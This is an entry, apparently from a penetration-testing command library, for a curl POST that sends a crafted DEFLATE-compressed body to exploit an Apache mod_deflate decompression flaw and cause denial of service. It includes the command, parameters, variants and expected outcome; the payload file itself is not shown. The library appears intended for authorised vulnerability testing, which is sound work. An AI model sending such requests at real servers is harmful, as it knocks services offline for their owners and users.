---
id: cmd-curl-deflate-dos-001
data: >-
  curl -X POST http://target-server.com/vulnerable-endpoint -H
  "Content-Encoding: deflate" --data-binary @crafted_deflate_payload.bin -v
tags:
  - dos
  - http
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:36.548Z'
verified: false
validated: true
submitted: true
---
# curl-deflate-dos

## Command

```bash
curl -X POST http://target-server.com/vulnerable-endpoint -H "Content-Encoding: deflate" --data-binary @crafted_deflate_payload.bin -v
```

## Description

This command sends a POST request to a target Apache server using curl, with a DEFLATE-encoded body from a file, exploiting the mod_deflate decompression flaw to cause resource exhaustion and denial of service. Use it when testing for the vulnerability in web servers with inbound compression enabled.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `http://target-server.com/vulnerable-endpoint` | URL of the target endpoint that processes compressed bodies | Yes |
| `-H "Content-Encoding: deflate"` | Sets the header indicating DEFLATE compression | Yes |
| `--data-binary @crafted_deflate_payload.bin` | Reads the binary compressed payload from file without modification | Yes |
| `-v` | Enables verbose output for debugging | No |

## Examples

### Basic Usage

```bash
curl -X POST http://example.com/test -H "Content-Encoding: deflate" --data-binary @payload.bin
```

### Advanced Usage

```bash
curl -X POST https://target.com/api/upload -H "Content-Encoding: deflate" --data-binary @malformed_payload.bin -v --max-time 60
```

## Expected Output

Verbose mode shows connection details, headers sent/received, and any response body. On success against a vulnerable server, the request hangs or times out due to server overload, with no immediate response. Server logs may indicate decompression failures.

## Related

- [[commands/create-deflate-payload]]
- [[procedures/Exploit-mod_deflate-Decompression-DoS]]
